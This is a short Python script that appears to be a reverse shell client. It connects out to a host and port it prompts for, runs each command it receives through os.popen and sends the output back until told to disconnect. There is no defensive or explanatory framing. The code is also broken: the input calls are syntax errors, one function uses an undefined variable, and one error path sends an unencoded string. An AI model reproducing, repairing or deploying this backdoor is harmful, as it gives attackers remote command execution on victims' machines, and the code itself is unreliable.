__author__ = 'RetR0'

import socket, os, signal, signal

def reciv():
    message = client.recv(2048)
    message = message.decode()
    print (message)

def main():
    host = input(host=)
    port = int(input(port=))

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect ((host, port))
    while True:
        try:
            it = client.recv(3072)
            it = it.decode('utf-8')
            commandum = it
            if 'DISCONNECT' in it:
                break
            try:
                result = os.popen(commandum).read()
                result = result.encode()
            except:
                result = "FATAL EWWOW"
            client.send(result)
        except:
            client.close()

main()

#version 1.0
